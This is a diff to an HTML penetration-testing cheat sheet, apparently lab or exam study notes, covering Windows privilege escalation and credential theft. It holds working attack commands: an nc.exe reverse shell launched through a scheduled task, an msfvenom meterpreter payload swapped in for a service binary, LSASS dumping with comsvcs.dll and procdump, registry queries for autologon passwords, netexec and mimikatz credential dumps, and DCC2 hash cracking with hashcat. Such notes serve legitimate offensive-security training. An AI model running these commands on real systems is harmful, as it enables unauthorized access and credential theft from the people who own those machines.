@@ -122,15 +122,26 @@ Find-AllVulns</code></pre>
             
                     <h2 id="Valuable files">Valuable files</h2>
                     <ul>
-                        <p> Equivalent for .bash_history </p>
-                        <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
-                        <p>Checking own History</p>
-                        <pre><code class="language-powershell">Get-History</code></pre>
-                        <p>Checking PSReadline which another history</p>
-                        <pre><code class="language-powershell">(Get-PSReadlineOption).HistorySavePath</code></pre>
+                        <h3>Command history</h3>
+                        <ul>
+                            <p> Equivalent for .bash_history </p>
+                            <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+                            <p>Checking own History (current powershell session)</p>
+                            <pre><code class="language-powershell">Get-History</code></pre>
+                            <p>Checking where the history file is saved. Just in case the administrator has configured a different path</p>
+                            <pre><code class="language-powershell">(Get-PSReadlineOption).HistorySavePath</code></pre>    
+                        </ul>
+                        <h3>Users with autologon</h3>
+                        <ul>
+                            <p>Check if there are users with autologon</p>
+                            <pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon, DefaultUsername, DefaultDomainName, DefaultPassword</code></pre>
+                        </ul>
+                        <h3>Checking Remote Desktop Connection Manager passwords</h3>
+                        <ul>
+                            <p>The file that contains credentials is located at:</p>
+                            <pre><code class="language-powershell">C:\Users\USER\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings</code></pre>
+                        </ul>
                         
-                        <p> Check if there are users with autologon</p>
-                        <pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon, DefaultUsername, DefaultDomainName, DefaultPassword</code></pre>
                     </ul>
             
         
@@ -716,12 +727,19 @@ schtasks /run /tn "Task1"  #Run the task</code></pre>
                         <pre><code class="language-bash">schtasks /create /tn "Task7" /tr "cmd /c C:\users\public\downloads\nc.exe -e cmd.exe 192.168.45.217 6666" /sc once /st 00:00 /ru "NT AUTHORITY\LOCAL SERVICE" /f
 schtasks /run /tn "Task7"</code></pre>
                         <p>Now if you gained the SeImpersonatePrivilege you can use it to escalate your privileges. <b>If not check the following</b> <a class="notion-link" href="#Combination">here</a> </p>    
-                        
-                        
-                        
+                    </ul>
 
-
-
+                    <h2 id="Abusing services">Abusing services</h2>
+                    <ul>
+                        <p>Just in case you use found a .exe file in a not common location, check if you are able to modify it and check it there is a service available</p>
+                        <p>In order to confirm it you can run tools like winpeas or SharpUp which will tell you if there a service related</p>
+                        <p>First generate your payload</p>
+                        <pre><code class="language-bash"></code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.237.254 LPORT=8080 -f exe -o met.exe</pre>
+                        <p>Then rename the target executable</p>
+                        <pre><code class="language-bash"></code>ren auditTracker.exe auditTracker.exe.old</pre>
+                        <p>Now copy your malicious executable to the target location and rename it with the target service .exe file</p>
+                        <p>Finally restart the service and wait for a reverse shell</p>
+                        <pre><code class="language-powershell">sc.exe start auditTracker</code></pre>
                     </ul>
 
                     <h2 id="BloodyAD">BloodyAD</h2>
@@ -1127,16 +1145,20 @@ impacket-secretsdump -sam 'sam.hive' -security 'security.save' -system 'system.s
 
                     <h2 id="Extracting LSASS">Extracting LSASS</h2>
                     <ul>
-                        <p>You can always export lsass from task manager but it is possible that you land in a host where you only have shell access. In order to extract it perform the following</p>
-                        <p>First identify the PID of lsass</p>
+                        <p>You can always export lsass from <b>task manager</b> but it is possible that you land in a host where you only have shell access. In order to extract it perform the following</p>
+                        
+                        <div class="button" onclick="toggleDiv()">Extracting from powershell</div>
+                                <div id="foldedDiv" class="content">
+                                       <p>First identify the PID of lsass</p>
                         <pre><code class="language-powershell">tasklist /svc #CMD
 Get-Process lsass #Powershell=</code></pre>
                         <p>Now create a dump file</p>    
                         <pre><code class="language-powershell">rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID C:\lsass.dmp full</code></pre>
                         <p>You can also do it with <b>procdump</b> from sysinternals</p>
                         <pre><code class="language-powershell">procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre>
+                                </div> 
                         
-                        <h3>Alternative ways to do it</h3>
+                        <h3>Easy option</h3>
                         <ul>
                             <p>You can automate this process with netexec</p>
                             <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
@@ -1145,8 +1167,18 @@ Get-Process lsass #Powershell=</code></pre>
                                 <div id="foldedDiv" class="content">
                                     <pre><code class="language-powershell">meterpreter > load kiwi
 meterpreter > lsa_dump_sam</code></pre>    
-                                </div>  
+                                </div>
+                                <h4>Cracking Domain Cached Credentials 2</h4>
+                                <ul>
+                                    <p>Just in case you have extracted lsass but you are seeing values like <b>$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f</b> means you are dealing with domain chached credentials. Those ones can be crack using</p>
+                                    <div class="button" onclick="toggleDiv()">How to crack Domain chached credentials</div>
+                                    <div id="foldedDiv" class="content">
+                                        <pre><code class="language-powershell">hashcat -m 2100 hashes /usr/share/wordlists/rockyou.txt</code></pre>    
+                                    </div>
+                                    </ul>
+                                <ul></ul>
                         </ul>
+
                         <p>In order to view it'ts content just do</p>
                         <h3>Mimikatz</h3>
                         <ul>
